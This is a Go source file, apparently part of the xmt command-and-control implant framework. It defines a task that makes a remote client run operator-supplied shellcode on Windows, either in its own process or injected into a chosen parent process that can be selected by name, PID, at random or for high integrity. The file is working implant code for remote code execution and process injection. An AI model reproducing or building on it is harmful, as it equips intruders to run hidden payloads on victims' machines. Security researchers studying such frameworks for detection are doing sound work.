package task

import (
	"context"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// TaskCode is a Task that instructs the Client to run the supplied shellcode and wait for completion if the 'Wait'
// flag is true.
const TaskCode simpleTask = 0xB005

// Code is a struct that is similar to the 'cmd.Code' struct. This is used to Task a Client with running shellcode
// on Windows devices. This struct has many of the functionallies of the standard 'cmd.Program' function. The
// 'SetParent*' function will attempt to set the target that runs the shellcode. If none are specified, the shellcode
// will be injected into the current process.
type Code struct {
	Data    []byte
	Wait    bool
	Timeout time.Duration

	pPID      int32
	pName     string
	pChoices  []string
	pElevated bool
}

// SetParent will instruct the Process to choose a parent with the supplied process name. If this string is empty,
// this will use the current process (default). This function has no effect if the device is not running Windows.
func (c *Code) SetParent(n string) {
	c.pName, c.pPID, c.pChoices = n, -1, nil
}

// SetParentPID will instruct the Process to choose a parent with the supplied process ID. If this number is
// zero, this will use the current process (default) and if < 0 this Process will choose a parent from a list
// of writable processes. This function has no effect if the device is not running Windows.
func (c *Code) SetParentPID(i int32) {
	c.pName, c.pPID, c.pChoices = "", i, nil
}

// SetParentRandom will set instruct the Process to choose a parent from the supplied string list on runtime. If this
// list is empty or nil, there is no limit to the name of the chosen process. This function has no effect if the
// device is not running Windows.
func (c *Code) SetParentRandom(n []string) {
	c.pName, c.pPID, c.pChoices = "", -1, n
}

// SetParentEx will instruct the Code thread to choose a parent with the supplied process name. If this string
// is empty, this will use the current process (default). This function has no effect if the device is not running
// Windows.
//
// If the specified bool is true, this function will attempt to choose a high integrity process and will fail if
// none can be opened or found.
func (c *Code) SetParentEx(n string, e bool) {
	c.pName, c.pPID, c.pChoices, c.pElevated = n, -1, nil, e
}

// MarshalStream writes the data for this Code thread to the supplied Writer.
func (c Code) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(c.Wait); err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(c.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBytes(c.Data); err != nil {
		return err
	}
	if err := w.WriteInt32(c.pPID); err != nil {
		return err
	}
	if err := w.WriteString(c.pName); err != nil {
		return err
	}
	if err := w.WriteBool(c.pElevated); err != nil {
		return err
	}
	if err := data.WriteStringList(w, c.pChoices); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Code thread from the supplied Reader.
func (c *Code) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&c.Wait); err != nil {
		return err
	}
	t, err := r.Uint64()
	if err != nil {
		return err
	}
	c.Timeout = time.Duration(t)
	if c.Data, err = r.Bytes(); err != nil {
		return err
	}
	if err = r.ReadInt32(&c.pPID); err != nil {
		return err
	}
	if err = r.ReadString(&c.pName); err != nil {
		return err
	}
	if err = r.ReadBool(&c.pElevated); err != nil {
		return err
	}
	if err = data.ReadStringList(r, &c.pChoices); err != nil {
		return err
	}

	return nil
}

// SetParentRandomEx will set instruct the Code thread to choose a parent from the supplied string list on runtime.
// If this list is empty or nil, there is no limit to the name of the chosen process. This function has no effect if
// the device is not running Windows.
//
// If the specified bool is true, this function will attempt to choose a high integrity process and will fail if
// none can be opened or found.
func (c *Code) SetParentRandomEx(n []string, e bool) {
	c.pName, c.pPID, c.pChoices, c.pElevated = "", -1, n, e
}
func taskCode(x context.Context, p *com.Packet) (*com.Packet, error) {
	var c Code
	if err := c.UnmarshalStream(p); err != nil {
		return nil, err
	}
	var (
		z   = cmd.NewCodeContext(x, c.Data)
		err error
	)
	z.Timeout = c.Timeout
	if err = z.Start(); err != nil {
		return nil, err
	}
	var (
		w    = new(com.Packet)
		h, _ = z.Handle()
	)
	if w.WriteUint64(uint64(h)); !c.Wait {
		w.WriteInt32(0)
		return w, nil
	}
	err = z.Wait()
	if _, ok := err.(*cmd.ExitError); !ok {
		w.Clear()
		return nil, err
	}
	e, _ := z.ExitCode()
	w.WriteInt32(e)
	w.Close()
	return w, nil
}
